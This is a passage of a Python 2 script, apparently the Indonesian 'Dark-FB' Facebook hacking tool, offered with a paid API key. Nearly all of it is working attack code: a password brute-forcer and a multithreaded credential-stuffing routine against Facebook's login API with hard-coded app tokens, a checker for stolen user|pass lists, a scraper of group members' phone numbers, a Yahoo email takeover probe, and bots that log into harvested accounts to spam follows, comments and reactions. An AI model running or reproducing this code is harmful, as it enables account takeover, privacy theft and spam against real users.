            print tutup + '\n[' + lime + '+' + tutup + '] Successfully get number phone friend from ' + lime + p['name'] + tutup
            done = raw_input(tutup + '[' + lime + '+' + tutup + '] Save file with name : ' + lime)
            print tutup + '[' + lime + '+' + tutup + '] Create file ...'
            time.sleep(2)
            os.rename('dump/no_dariteman.txt', 'dump/' + done)
            print tutup + '[' + lime + '+' + tutup + '] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '[' + lime + '+' + tutup + '] Selesai ^-^'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()


def no_member():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError: pass
    idg = raw_input(tutup+"["+lime+"+"+tutup+"] Input ID Group : "+lime)
    try:
            r = requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+token)
            s = json.loads(r.text)
	    print tutup+"["+blue+"$"+tutup+"] Name Group : "+lime+s["name"]+tutup
    except KeyError:
	    print tutup+"["+merah+"!"+tutup+"] Group Not Found"
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()
    try:
	    print tutup+"["+lime+"+"+tutup+"] Fetching number phone from member group ..."+tutup
	    save = open('dump/no_member.txt','w')
	    y = requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+token)
	    z = json.loads(y.text)
	    for a in z['data']:
		    x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+token)
		    z = json.loads(x.text)
		    try:
			    nomem.append(z['mobile_phone'])
			    save.write(z['mobile_phone']+'\n')
			    print (tutup+"\r[ "+lime+str(len(nomem))+tutup+" ] "+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
		    except KeyError: pass
	    save.close()
	    print tutup+"\n["+lime+"+"+tutup+"] Successfully get number phone from member group"
	    done = raw_input(tutup+"["+lime+"+"+tutup+"] Save file with name : "+lime)
	    print tutup+"["+lime+"+"+tutup+"] Create file ..."; time.sleep(2)
	    os.rename('dump/no_member.txt','dump/'+done)
	    print tutup+"["+lime+"+"+tutup+"] File saved : "+lime+"dump/"+done+tutup
	    print tutup+"["+lime+"+"+tutup+"] Selesai ^-^"
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()
    except KeyboardInterrupt:
	    save.close()
	    print tutup+"\n["+lime+"+"+tutup+"] Successfully get number phone from member group"
	    done = raw_input(tutup+"["+lime+"+"+tutup+"] Save file with name : "+lime)
	    print tutup+"["+lime+"+"+tutup+"] Create file ..."; time.sleep(2)
	    os.rename('dump/no_member.txt','dump/'+done)
	    print tutup+"["+lime+"+"+tutup+"] File saved : "+lime+"dump/"+done+tutup
	    print tutup+"["+lime+"+"+tutup+"] Selesai ^-^"
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()


def hack():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup+"("+lime+"01"+tutup+") BruteForce"
    print tutup+"("+lime+"02"+tutup+") Multi BruteForce"
    print tutup+"("+lime+"03"+tutup+") Super Multi BruteForce"
    print tutup+"("+lime+"04"+tutup+") Yahoo Checker"
    print tutup+"("+merah+"00"+tutup+") Back"
    print
    mana_hack = raw_input(tutup+"["+lime+"Joker"+tutup+"]> "+lime)
    if mana_hack =="":
	    exit(tutup+"["+merah+"!"+tutup+"] Exit"+tutup)
    elif mana_hack in ['1','01']:
	    force()
    elif mana_hack in ['2','02']:
        multi()
        hasil()
    elif mana_hack in ['3','03']:
	    super()
    elif mana_hack in ['4','04']:
	    yahoofriends()
    elif mana_hack in ['0','00']:
	    menu()
    else:
	    exit(tutup+"["+merah+"!"+tutup+"] Exit"+tutup)

def force():
    try:
	os.mkdir('crack')
	token = open('logs.txt').read()
    except OSError: pass
    try:
	    id = raw_input(tutup+"["+lime+"+"+tutup+"] ID Target : "+lime)
	    list = raw_input(tutup+"["+lime+"+"+tutup+"] Wordlist : "+lime)
	    isi = open(list,'r').readlines()
    except IOError:
	    exit(tutup+"["+merah+"!"+tutup+"] Wordlist not found"+tutup)
    print (tutup+"\r["+lime+"+"+tutup+"] Total list : "+lime+str(len(isi)))
    sandi = open(list,'r')
    for ps in sandi:
	    try:
		    ps = ps.replace("\n","")
		    print (tutup+"\r["+merah+"*"+tutup+"] Try : "+ps+lime)
		    r = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(ps)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		    s = json.loads(r.text)
		    if 'access_token' in s:
			    dapat = open("crack/brute.txt","w")
			    dapat.close()
			    print tutup+"["+lime+"+"+tutup+"] Found : "+lime+id+tutup+"|"+lime+ps+tutup
			    exit()
		    elif 'www.facebook.com' in s['error_msg']:
			    cek = open("crack/brute_cek.txt","w")
			    cek.close()
			    print tutup+"["+lime+"+"+tutup+"] Found : "+lime+id+tutup+"|"+lime+ps+tutup
			    exit()
	    except requests.exceptions.ConnectionError:
		    print tutup+"["+merah+"!"+tutup+"] Koneksi error"
		    time.sleep(1)


def multi():
    global idlist,file,pasw
    print
    idlist = raw_input(tutup+"["+lime+"+"+tutup+"] List ID : "+lime)
    pasw = raw_input(tutup+"["+lime+"+"+tutup+"] Password : "+lime)
    try:
	    file = open(idlist,'r')
	    for z in range(40):
		    t = threading.Thread(target=nextc, args=())
		    t.start()
		    threads.append(t)
	    for t in threads:
		    t.join()
    except IOError:
	    exit(tutup+"["+merah+"!"+tutup+"] File not found"+tutup)


def nextc():
    try:
        os.mkdir('crack')
        token = open('logs.txt').read()
    except OSError:
        pass
    else:
        try:
            buka = open(idlist, 'r')
            isi = buka.read().split()
            while file:
                user = file.readline().strip()
                url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pasw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                data = urllib.urlopen(url)
                w = json.load(data)
                if back == len(isi):
                    break
                if 'access_token' in w:
                    ok = open('crack/multi_ok.txt', 'w')
                    ok.write(user + '|' + pasw + '\n')
                    ok.close()
                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                    z = json.loads(x.text)
                    berhasil.append(tutup + '[' + lime + 'OK' + tutup + '] ' + user + ' | ' + pasw + ' = ' + z['name'])
                elif 'www.facebook.com' in w['error_msg']:
                    cek = open('crack/multi_cek.txt', 'w')
                    cek.write(user + '|' + pasw + '\n')
                    cek.close()
                    checkpoint.append(tutup + '[' + kuning + 'CP' + tutup + '] ' + user + ' | ' + pasw + tutup)
                else:
                    gagal.append(user)
                    back += 1
                sys.stdout.write(tutup + '\r[' + blue + '*' + tutup + '] ' + str(back) + lime + '/' + tutup + str(len(isi)) + tutup + ' = ' + lime + str(len(berhasil)) + tutup + ' ' + kuning + str(len(checkpoint)) + tutup + ' ' + merah + str(len(gagal)) + tutup)
                sys.stdout.flush()

        except IOError:
            print merah + '\n...' + tutup
        except requests.exceptions.ConnectionError:
            print tutup + '[' + merah + '!' + tutup + '] Koneksi Error'
            hasil()
 

def hasil():
    print
    for b in berhasil:
        print b
        print tutup + '[' + lime + '+' + tutup + '] File Saved : ' + lime + 'crack/multi_ok.txt' + tutup

    for c in checkpoint:
        print c
        print tutup + '[' + lime + '+' + tutup + '] File Saved : ' + lime + 'crack/multi_cek.txt' + tutup

    exit(tutup + '[' + merah + '!' + tutup + '] Exit')

def super():
    print
    try:
        os.mkdir('crack')
    except OSError:
        pass
    else:
        if os.path.exists('crack/auto_ok.txt'):
            if os.path.getsize('crack/auto_ok.txt') != 0:
                oh = raw_input(tutup + '[' + lime + '+' + tutup + '] ' + lime + 'crack/auto_ok.txt' + tutup + ' replace?(y/n): ' + lime)
                if oh == 'y':
                    open('crack/auto_ok.txt', 'w').close()
            else:
                open('crack/auto_cek.txt', 'w').close()
        if os.path.exists('crack/auto_cek.txt'):
            if os.path.getsize('crack/auto_cek.txt') != 0:
                cp = raw_input(tutup + '[' + lime + '+' + tutup + '] ' + lime + 'crack/auto_cek.txt' + tutup + ' replace?(y/n): ' + lime)
                if cp == 'y':
                    open('crack/auto_cek.txt', 'w').close()
            else:
                open('crack/auto_cek.txt', 'w').close()
        file = raw_input(tutup + '[' + lime + '+' + tutup + '] List ID : ' + lime)
        pw = raw_input(tutup + '[' + lime + '+' + tutup + '] Extra Password : ' + lime)
        try:
            pr = open(file, 'r').read().splitlines()
            for x in pr:
                auto_total.append(x)
                print tutup + '\r[' + lime + '+' + tutup + '] Total : ' + lime + str(len(auto_total)),
                sys.stdout.flush()
                time.sleep(0.0001)

        except IOError:
            exit(tutup + '[' + merah + '!' + tutup + '] File not found' + tutup)

    p = ThreadPool(input('\n' + tutup + '[' + lime + '+' + tutup + '] Threads : ' + lime))
    p.map(cekrek, auto_total)
    if auto_ok > 0 or auto_cp > 0:
        print tutup + '[' + lime + '+' + tutup + '] Total : ' + lime + str(len(auto_ok)) + tutup + ' ' + kuning + str(len(auto_cp)) + tutup
    else:
        exit(tutup + '[' + merah + '!' + tutup + '] Tidak ada result')
    if auto_ok > 0:
        print tutup + '[' + lime + '+' + tutup + '] File Saved : ' + lime + 'crack/auto_ok.txt' + tutup
    if auto_cp > 0:
        print tutup + '[' + lime + '+' + tutup + '] File Saved : ' + kuning + 'crack/auto_cp.txt' + tutup
    exit(tutup + '[' + merah + '!' + tutup + '] Exit')


def yahoofriends():
    try:
       token = open('logs.txt').read()
    except:
        print('Token Tidak Ada')
    print
    mpsh = []
    jml = 0
    print tutup+"["+lime+"+"+tutup+"] Pastikan koneksi lancar ..."+tutup
    teman = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
    kimak = json.loads(teman.text)
    save = open('MailVuln.txt','w')
    for w in kimak['data']:
	    jml +=1
	    mpsh.append(jml)
	    id = w['id']
	    nama = w['name']
	    r = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
	    z = json.loads(r.text)
	    try:
		    mail = z['email']
		    yahoo = re.compile(r'@.*')
		    otw = yahoo.search(mail).group()
		    if 'yahoo.com' in otw:
			    sex.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			    sex._factory.is_html = True
			    sex.select_form(nr=0)
			    sex["username"] = mail
			    klik = sex.submit().read()
			    jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			    try:
				    pek = jok.search(klik).group()
			    except:
				    print tutup+"["+merah+"!"+tutup+"] Mail : "+mail+merah+" Not vuln"
				    continue
			    if '"messages.ERROR_INVALID_USERNAME">' in pek:
				    save.write(mail + '\n')
				    print tutup+"["+lime+"+"+tutup+"] Mail : "+mail+lime+" Vuln"
			    else:
				    print tutup+"["+merah+"!"+tutup+"] Mail : "+mail+merah+" Not vuln"
	    except KeyError:
		    pass
    raw_input(tutup+"\nEnter returns to the menu ...")
    menu()


def daftar():
    os.system('clear')
    try:
        os.mkdir('api')
        token = open('logs.txt').read()
    except OSError:
        pass

    print tutup + '               [ Dark-FB ]v1.8               '
    print 'Ingin membeli api-key bisa hubungi saya melalui : '
    print tutup + 'WA.me : ' + lime + '+62 82288231535' + tutup
    print
    on = raw_input('[>] Masukkan API KEY : ')
    r = requests.get('https://pastebin.com/raw/ANfbRTP3').text
    if on == '':
        daftar()
    elif len(on) < 10:
        daftar()
    elif on in r:
        sv = open('api/key.txt', 'w')
        sv.write(on)
        sv.close()
        login()
    else:
        daftar()


def bot():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup + '(' + lime + '01' + tutup + ') React target post'
    print tutup + '(' + lime + '02' + tutup + ') React group post'
    print tutup + '(' + lime + '03' + tutup + ') Coment target post'
    print tutup + '(' + lime + '04' + tutup + ') Coment grup post'
    print tutup + '(' + lime + '05' + tutup + ') Add friend from target ID'
    print tutup + '(' + lime + '06' + tutup + ') Accept all friend requests'
    print tutup + '(' + lime + '07' + tutup + ') Delete all friends'
    print tutup + '(' + lime + '08' + tutup + ') Delete all post'
    print tutup + '(' + lime + '09' + tutup + ') Auto follow'
    print tutup + '(' + merah + '00' + tutup + ') Back'
    print
    mana_bot = raw_input(tutup + '[' + lime + 'Joker' + tutup + ']> ' + lime)
    if mana_bot == '':
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)
    elif mana_bot in ('1', '01'):
        react_target()
    elif mana_bot in ('2', '02'):
        react_grup()
    elif mana_bot in ('3', '03'):
        target_komen()
    elif mana_bot in ('4', '04'):
        grup_komen()
    elif mana_bot in ('5', '05'):
        add()
    elif mana_bot in ('6', '06'):
        acc()
    elif mana_bot in ('7', '07'):
        delete()
    elif mana_bot in ('8', '08'):
        deletepost()
    elif mana_bot in ('9', '09'):
        follow()
    elif mana_bot in ('0', '00'):
       menu()
    else:
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)


def react_target():
    reaksi = []
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup+"("+lime+"01"+tutup+") Like\n"+tutup+"("+lime+"02"+tutup+") Love\n"+tutup+"("+lime+"03"+tutup+") Wow\n"+tutup+"("+lime+"04"+tutup+") Haha\n"+tutup+"("+lime+"05"+tutup+") Sad\n"+tutup+"("+lime+"06"+tutup+") Angry\n"+tutup+"("+merah+"00"+tutup+") Back"
    print
    emot = raw_input(tutup+"["+lime+"Joker"+tutup+"]> "+lime)
    if emot in ['1','01']:
	    tipe = "LIKE"
    elif emot in ['2','02']:
	    tipe = "LOVE"
    elif emot in ['3','03']:
	    tipe = "WOW"
    elif emot in ['4','04']:
	    tipe = "HAHA"
    elif emot in ['5','05']:
	    tipe = "SAD"
    elif emot in ['6','06']:
	    tipe = "ANGRY"
    elif emot in ['0','00']:
	    menu()
    else:
	    exit(tutup+"["+merah+"!"+tutup+"] Exit"+tutup)
    print
    id = raw_input(tutup+"["+lime+"+"+tutup+"] Input ID Target : "+lime)
    limit = raw_input(tutup+"["+lime+"+"+tutup+"] Limit : "+lime)
    try:
	    r = requests.get("https://graph.facebook.com/"+id+"?fields=feed.limit("+limit+")&access_token="+token)
	    x = json.loads(r.text)
	    for z in x['feed']['data']:
		    idz = z['id']
		    reaksi.append(idz)
		    requests.post("https://graph.facebook.com/"+idz+"/reactions?type="+tipe+"&access_token="+token)
		    print(tutup+"\r["+blue+"*"+tutup+"] "+str(len(reaksi))+lime+"/"+tutup+limit),;sys.stdout.flush()
	    print tutup+"\n["+lime+"+"+tutup+"] Done"+tutup
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()
    except KeyError:
	    exit(tutup+"["+merah+"!"+tutup+"] ID Not Found"+tutup)


def react_grup():
    reaksi = []
    try:
    	token = open('logs.txt').read
    except:
    	menu()
    print tutup + '(' + lime + '01' + tutup + ') Like\n' + tutup + '(' + lime + '02' + tutup + ') Love\n' + tutup + '(' + lime + '03' + tutup + ') Wow\n' + tutup + '(' + lime + '04' + tutup + ') Haha\n' + tutup + '(' + lime + '05' + tutup + ') Sad\n' + tutup + '(' + lime + '06' + tutup + ') Angry\n' + tutup + '(' + merah + '00' + tutup + ') Back'
    print
    emot = raw_input(tutup + '[' + lime + 'Joker' + tutup + ']> ' + lime)
    if emot in ('1', '01'):
        tipe = 'LIKE'
    elif emot in ('2', '02'):
        tipe = 'LOVE'
    elif emot in ('3', '03'):
        tipe = 'WOW'
    elif emot in ('4', '04'):
        tipe = 'HAHA'
    elif emot in ('5', '05'):
        tipe = 'SAD'
    elif emot in ('6', '06'):
        tipe = 'ANGRY'
    elif emot in ('0', '00'):
        menu()
    else:
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)
    print
    id = raw_input(tutup + '[' + lime + '+' + tutup + '] Input ID Group : ' + lime)
    limit = raw_input(tutup + '[' + lime + '+' + tutup + '] Limit : ' + lime)
    try:
    	token = open('logs.txt').read()
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + token)
        asw = json.loads(r.text)
        print tutup + '[' + lime + '+' + tutup + '] Name Group : ' + lime + asw['name']
    except KeyError:
        exit(tutup + '[' + merah + '!' + tutup + '] Group Not Found' + tutup)
    else:
        try:
            r = requests.get('https://graph.facebook.com/v3.0/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
            x = json.loads(r.text)
            for z in x['feed']['data']:
                idz = z['id']
                reaksi.append(idz)
                requests.post('https://graph.facebook.com/' + idz + '/reactions?type=' + tipe + '&access_token=' + token)
                print tutup + '\r[' + blue + '*' + tutup + '] ' + str(len(reaksi)) + lime + '/' + tutup + limit,
                sys.stdout.flush()

            print tutup + '\n[' + lime + '+' + tutup + '] Done' + tutup
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyError:
            exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)


def target_komen():
    komen = []
    try:
    	token = open('logs.txt').read
    except:
    	menu()
    print tutup + '[' + lime + '+' + tutup + "] Type '<>' untuk baris baru" + tutup
    id = raw_input(tutup + '[' + lime + '+' + tutup + '] Input ID Target : ' + lime)
    kom = raw_input(tutup + '[' + lime + '+' + tutup + '] Komentar : ' + lime)
    limit = raw_input(tutup + '[' + lime + '+' + tutup + '] Limit : ' + lime)
    km = kom.replace('<>', '\n')
    try:
    	token = open('logs.txt').read()
        r = requests.get('https://graph.facebook.com/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        f = json.loads(r.text)
        for z in f['feed']['data']:
            ie = z['id']
            komen.append(ie)
            requests.post('https://graph.facebook.com/' + ie + '/comments?message=' + km + '&access_token=' + token)
            print tutup + '\r[' + blue + '*' + tutup + '] ' + str(len(komen)) + lime + '/' + tutup + limit,
            sys.stdout.flush()

        print tutup + '\n[' + lime + '+' + tutup + '] Done' + tutup
        raw_input(tutup + '\nEnter returns to the menu ...')
        menu()
    except KeyError:
        exit(tutup + '[' + merah + '!' + tutup + '] Target Not Found' + tutup)


def grup_komen():
    komengrup = []
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup + '[' + lime + '+' + tutup + "] Type '<>' untuk baris baru" + tutup
    id = raw_input(tutup + '[' + lime + '+' + tutup + '] Input ID Group : ' + lime)
    kom = raw_input(tutup + '[' + lime + '+' + tutup + '] Komentar : ' + lime)
    limit = raw_input(tutup + '[' + lime + '+' + tutup + '] Limit : ' + lime)
    km = kom.replace('<>', '\n')
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + token)
        asw = json.loads(r.text)
        print tutup + '[' + lime + '+' + tutup + '] Name Group : ' + lime + asw['name']
    except KeyError:
        exit(tutup + '[' + merah + '!' + tutup + '] Group Not Found' + tutup)
    else:
        try:
            p = requests.get('https://graph.facebook.com/v3.0/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
            a = json.loads(p.text)
            for e in a['feed']['data']:
                grep = e['id']
                komengrup.append(grep)
                requests.post('https://graph.facebook.com/' + grep + '/comments?message=' + km + '&access_token=' + token)
                print tutup + '\r[' + blue + '*' + tutup + '] ' + str(len(komengrup)) + lime + '/' + tutup + limit,
                sys.stdout.flush()

            print tutup + '\n[' + lime + '+' + tutup + '] Done' + tutup
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyError:
            exit(tutup + '[' + merah + '!' + tutup + '] Group Not Found' + tutup)


def add():
    ado = []
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    id = raw_input(tutup+"["+lime+"+"+tutup+"] Target ID : "+lime)
    try:
	    r = requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(100)&access_token='+token)
	    t = json.loads(r.text)
    except KeyError: exit(tutup+"["+merah+"!"+tutup+"] Target Not Found"+tutup)
    for y in t['friends']['data']:
	    ado.append(y['id'])
	    req = requests.post('https://graph.facebook.com/me/friends/'+y['id']+'?access_token='+token).text
	    if 'true' in req:
		    print tutup+"["+lime+"+"+tutup+"] Berhasil : "+lime+y['name']+tutup
	    else:
		    print tutup+"["+merah+"!"+tutup+"] Gagal : "+lime+y['name']+tutup
    print tutup+"["+lime+"+"+tutup+"] Done"+tutup
    raw_input(tutup+"\nEnter returns to the menu ...")
    menu()


def acc():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    limit = raw_input(tutup+"["+lime+"+"+tutup+"] Limit : "+lime)
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+token)
    t = json.loads(r.text)
    if '[]' in str(t['data']):
	    print tutup+"["+merah+"!"+tutup+"] No friend request"+tutup
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()
    for i in t['data']:
	    r = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+token)
	    a = json.loads(r.text)
	    if 'error' in str(a):
		    print tutup+"["+merah+"!"+tutup+"] Gagal = "+i['from']['name']
	    else:
		    print tutup+"["+lime+"+"+tutup+"] Terima = "+i['from']['name']
    print tutup+"["+lime+"+"+tutup+"] Done"+tutup
    raw_input(tutup+"\nEnter returns to the menu ...")
    menu()


def delete():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup + '[' + merah + '!' + tutup + '] INFO : CTRL+C to STOP'
    print tutup + '[' + lime + '+' + tutup + '] START ...'
    try:
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
        t = json.loads(r.text)
        for i in t['data']:
            nama = i['name']
            id = i['id']
            requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + token)
            print tutup + '[' + lime + '+' + tutup + '] Deleted = ' + nama

    except IndexError:
        pass
    except KeyboardInterrupt:
        exit(tutup + '[' + merah + '!' + tutup + '] Stopped.')

    print tutup + '[' + lime + '+' + tutup + '] Done' + tutup
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def deletepost():
    loop = 0
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup + '[' + merah + '!' + tutup + '] INFO : CTRL+C to STOP'
    print tutup + '[' + lime + '+' + tutup + '] START ...'
    try:
        r = requests.get('https://graph.facebook.com/me/feed?access_token=' + token)
        f = json.loads(r.text)
        for y in f['data']:
            id = y['id']
            url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + token)
            get = json.loads(url.text)
            try:
                error = get['error']['message']
                print tutup + '[' + merah + '!' + tutup + '] Gagal : ' + id
            except TypeError:
                print tutup + '[' + lime + '+' + tutup + '] Terhapus : ' + id
                loop += 1

    except KeyboardInterrupt:
        exit(tutup + '[' + merah + '!' + tutup + '] Stopped.')

    print tutup + '[' + lime + '+' + tutup + '] Done' + tutup
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def follow():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup + '[' + merah + '!' + tutup + "] INFO : Pemisah 'user|pass'"
    file = raw_input(tutup + '[' + lime + '+' + tutup + '] List account : ' + lime)
    idt = raw_input(tutup + '[' + lime + '+' + tutup + '] Your account id : ' + lime)
    isi = open(file, 'r').read().splitlines()
    print tutup + '[' + lime + '+' + tutup + '] START ...'
    for z in isi:
        o = z.split('|')
        user = o[0]
        pw = o[1]
        print tutup + '[' + ungu + '*' + tutup + '] Follow with account = ' + user + '|' + pw + tutup
        try:
            api_seret = '62f8ce9f74b12f84c123cc23437a4a32'
            data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': user, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pw, 'return_ssl_resources': '0', 'v': '1.0'}
            sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + user + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pw + 'return_ssl_resources=0v=1.0' + api_seret).encode('utf-8')
            x = hashlib.new('md5')
            x.update(sig)
            data.update({'sig': x.hexdigest()})
            urls = requests.get('https://api.facebook.com/restserver.php', params=data)
            b = json.loads(urls.text)
            toke = b['access_token']
        except KeyError:
            print tutup + '[' + merah + '!' + tutup + '] Login failed'
        else:
            try:
                r = requests.post('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + toke)
                if 'error' in str(r.text):
                    print tutup + '[' + merah + '!' + tutup + '] Gagal' + tutup
                elif 'true' in str(r.text):
                    print tutup + '[' + lime + '+' + tutup + '] Berhasil' + tutup
                else:
                    print tutup + '[' + merah + '!' + tutup + '] Error' + tutup
            except:
                pass

    print tutup + '[' + lime + '+' + tutup + '] Done' + tutup
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def status():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    capt = raw_input(tutup+"["+lime+"+"+tutup+"] Caption : "+lime)
    if capt =="":
	    exit(tutup+"["+merah+"!"+tutup+"] Exit"+tutup)
    else:
	    print tutup+"["+lime+"+"+tutup+"] Create ..."
	    r = requests.get("https://graph.facebook.com/me/feed?method=POST&message="+capt+"&access_token="+token)
	    x = json.loads(r.text)
	    print tutup+"["+lime+"+"+tutup+"] Status ID : "+x['id']
    print tutup+"["+lime+"+"+tutup+"] Done"+tutup
    raw_input(tutup+"\nEnter returns to the menu ...")
    menu()


def guard():
    try:
        token = open('logs.txt').read()
    except:
        menu()
    print tutup + '(' + lime + '01' + tutup + ') Aktifkan    ' + tutup + '(' + lime + '02' + tutup + ') Matikan'
    print
    ha = raw_input(tutup + '[' + lime + 'Joker' + tutup + ']> ' + lime)
    if ha == '':
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)
    elif ha in ('1', '01'):
        aktif = 'true'
        gaz(token, aktif)
    elif ha in ('2', '02'):
        non = 'false'
        gaz(token, non)
    else:
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)


def gaz(token, enable=True):
    r = requests.get("https://graph.facebook.com/me?access_token="+token)
    g = json.loads(r.text)
    id = g["id"]
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % token}
    url = "https://graph.facebook.com/graphql"
    pek = requests.post(url, data = data, headers = headers)
    if '"is_shielded":true' in pek.text:
	    print tutup+"["+lime+"+"+tutup+"] Telah diaktifkan"+tutup
	    print tutup+"["+lime+"+"+tutup+"] Done"+tutup
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()
    elif '"is_shielded":false' in pek.text:
	    print tutup+"["+lime+"+"+tutup+"] Telah dimatikan"+tutup
	    print tutup+"["+lime+"+"+tutup+"] Done"+tutup
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()
    else:
	    exit(tutup+"["+merah+"!"+tutup+"] Error"+tutup)


def lgrup():
    try:
        token = open('logs.txt').read()
    except:
        print('Token Tidak Ada')
        menu()
    print
    listgrup = []
    r = requests.get('https://graph.facebook.com/me/groups?access_token='+token)
    grup = json.loads(r.text)
    for g in grup['data']:
	    nama = g["name"]
	    id = g["id"]
	    listgrup.append(id)
	    print tutup+"["+lime+"+"+tutup+"] "+id+" | "+nama+tutup
    print tutup+"["+lime+"+"+tutup+"] Total Group : "+lime+str(len(listgrup))+tutup
    print tutup+"["+lime+"+"+tutup+"] Done"+tutup
    raw_input(tutup+"\nEnter returns to the menu ...")
    menu()


def acek():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    live = []
    cek = []
    die = []
    print tutup + '[' + merah + '!' + tutup + "] INFO : Pemisah 'user|pass'"
    file = raw_input(tutup + '[' + lime + '+' + tutup + '] List account : ' + lime)
    try:
        list = open(file, 'r').readlines()
    except IOError:
        exit(tutup + '[' + merah + '!' + tutup + '] File not found' + tutup)

    for x in list:
        user, pw = x.strip().split(str('|'))
        r = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        z = json.loads(r.text)
        if 'access_token' in z:
            live.append(user)
            print tutup + '[' + lime + '+' + tutup + '] Live = ' + user + '|' + pw
        elif 'www.facebook.com' in z['error_msg']:
            cek.append(user)
            print tutup + '[' + kuning + '+' + tutup + '] Check = ' + user + '|' + pw
        else:
            die.append(user)
            print tutup + '[' + merah + '!' + tutup + '] Die = ' + user + '|' + pw

    print tutup + '[' + lime + '+' + tutup + '] Total : ' + lime + str(len(live)) + tutup + ' ' + kuning + str(len(cek)) + tutup + ' ' + merah + str(len(die)) + tutup
    print tutup + '[' + lime + '+' + tutup + '] Done' + tutup
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def acekpp():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup + '[' + merah + '!' + tutup + '] INFO : Login dengan akun yang ingin di cek'
    user = raw_input(tutup + '[' + lime + '+' + tutup + '] Username : ' + lime)
    pw = raw_input(tutup + '[' + lime + '+' + tutup + '] Password : ' + lime)
    print tutup + '[' + ungu + '*' + tutup + '] Check with account = ' + user + '|' + pw + tutup
    data = {'email': user, 'pass': pw}
    r = apa.post('https://mbasic.facebook.com/login', data=data).text.encode('utf-8')
    if 'save-device' in str(r) or 'm_sess' in str(r):
